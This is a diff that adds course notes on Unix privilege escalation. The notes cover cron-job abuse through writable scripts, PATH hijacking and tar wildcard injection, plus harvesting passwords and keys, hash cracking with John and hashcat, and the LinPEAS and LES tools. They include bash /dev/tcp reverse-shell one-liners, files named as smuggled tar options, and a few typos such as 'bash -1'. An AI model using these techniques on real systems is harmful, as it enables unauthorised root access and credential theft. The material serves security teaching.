@@ -251,7 +251,46 @@ In short, **sudo** set the UID and GID to those of the superuser.
 ## 06 - Hacking Unix p2
 
 ### Exploiting cronjobs
-Cron is a task scheduler on Unix-like systems, which allows defining commands to execute periodically. Schedules specified in cron expressions within crontab files. You can use `crontab -l` to show cronjobs for the current user. Cron jobs often do maintenance for services often running root. If we can tamper with what those cron jobs are executing, we can execute commands as root. 
+Cron is a task scheduler on Unix-like systems, which allows defining commands to execute periodically. Schedules are specified in cron expressions within crontab files. You can use `crontab -l` to show cronjobs for the current user. Cron jobs often do maintenance for services often running **root**. If we can tamper with what those cron jobs are executing, we can execute commands as root. We are going to see 3 different methods.
+
+#### Method 1 - Writable cron scripts
+The `overwrite.sh` script is executed every minute and it's world-writeable. 
+You can write inside the script to create a bind or reverse shell:
+1. Create a listening server with **netcat** on the local machine: 
+	- `nc -lp 8888`
+2. Overwrite `overwrite.sh` with:
+	- `bash -1 >& /dev/tcp/127.0.0.1/8888 0>&1`
+3. Wait for the cron job to be executed
+
+As we have seen before, this cron job is executed every minute with the root user. So, on average after 30 seconds, Privilege Escalation is achieved: we got a root shell. 
+
+#### Method 2 - Insecure crontab PATH
+`overwrite.sh`is executed using its relative path &rarr; `bin/sh` will search it in each directory in the PATH env variable. 
+
+Can we write in any of the directories in PATH coming **before** the location of `overwrite.sh`? 
+1. Create a listening server with **netcat** on the local machine:
+	- `nc -lp 7777`;
+2. Create a file named `overwrite.sh` in `/home/user/` containing, make it executable:
+	- `#!/bin/sh`;
+	- `bash -i >& /dev/tcp/127.0.0.1/7777 0>&1`.
+3. Wait for the cron job to be executed.
+
+#### Method 3 - Insecure scripts
+The * wildcard is expanded by the shell and passed to the command (tar in this case). Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) we learn that **tar** can execute external commands as part of a checkpoint feature:
+1. Create listening server with **netcat** on the local machine:
+	- `nc -lp 9999`;
+2. Create an executable script, named `myshell.sh`, in the user directory:
+	- `#!/bin/sh`;
+	- `bash -i >& /dev/tcp/127.0.0.1/9999 0>&1`.
+3. Create fake files in the user home (where the * is expanded), to trick **tar**:
+	- `touch /home/user/--checkpoint=1`;
+	- `touch /home/user/--checkpoint-action=exec=shell.elf`.
+4. Wait for the cron job to be executed.
+
+What happened?
+After wildcard expansion, **tar** has been executed as:
+	- `tar czf /tmp/backup.tar.gz \
+			--checkpoint=1 --checkpoint-action=exec=myshell.sh myshell.sh tools`
 
 ### Password and keys
 Having an initial foothold on a system means that we can gather more details like:
@@ -259,5 +298,59 @@ Having an initial foothold on a system means that we can gather more details lik
 - Shell History;
 - Keys.
 	
-### Configuration files
+#### Configuration files
 If we got the foothold by exploiting a server, we should be impersonating the user used by the server. Configuration file or the application (e.g. web application) might contain password, e.g. database password. 
+
+##### Example scenario
+We exploited a web application
+1. Get the DB password from configuration files;
+2. Access the database (we will see later how to reach this, if needed)
+	- Data exfiltration could also happen here
+3. Gather application users and passwords.
+
+In general, if the exploited servers have users, try to gather their password. Why? Humans reuse passwords: 
+- Enumerate local machine users (e.g., `cat /etc/passwd`);
+- Try passwords gathered (e.g., `su - <user>`)
+
+##### Cracking password
+If we need to crack hashed passwords, we can use rainbow tables...But...Good applications encrypt passwords, better applications also do it properly:
+- using **salt** and recommended algorithms, like Argon2 or **Bcrypt**;
+
+We can use wordlists and cracking applications: this is particularly useful if the application used salt. There are two popular tools:
+- [John the ripper](https://www.openwall.com/john/) - multipurpose cracking tool:
+	- `john --format=crypt --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt hashes.txt`
+- **hashcat** - fast, optimized for GPUs:
+	- `hashcat -a0 -m1400 ./sha256-hashes.txt ~/Developer/rockyou/rockyou.txt 
+
+#### Shell history
+If the “service user” has been used for interactive sessions, or if we have moved laterally to an interactive user, **shell history** might reveal useful information to perform PE:
+- Leak passwords;
+- Common operations which we can use to gather more information. 
+
+##### Realistic scenario
+![alt text](image.png)
+
+#### Other keys
+When elevating privileges or moving laterally, we might want to gather authentication material like keys, to log into other systems and gather more information. Typical examples:
+- SSH keys;
+- GPG keys - e.g., social engineering.
+
+### LinPEAS 
+[LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) - Linux Privilege Escalation Awesome Script, is a script that searches for possible paths to escalate privileges on Unix (not just Linux) hosts: 
+- Checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation);
+- Searches for possible Privilege Escalation Paths;
+- Doesn't have any dependency!.
+
+It is noisy, leave tracks + easily detected by EDR (Endpoint Detection and Response). When running CTFs, use `-a` option to perform extra checks:
+- searches for more possible hashes inside files;
+- brute-force each user using su with the top2000 passwords. 
+
+#### Example
+How being in the docker group be a PE vector?
+User is unprivileged, but: They can be root in a container ⇒ they could access the host filesystem as root.
+
+### Linux Exploit Suggester (LES)
+[LES](https://github.com/The-Z-Labs/linux-exploit-suggester) assist in detecting security deficiencies for a given Linux kernel/Linux-based machine:
+- Assess kernel exposure on publicly known exploits:
+	- For each exploit, exposure is calculated : Highly probable / Probable / Less probable / Unprobable
+- Verify state of kernel hardening security measures. 
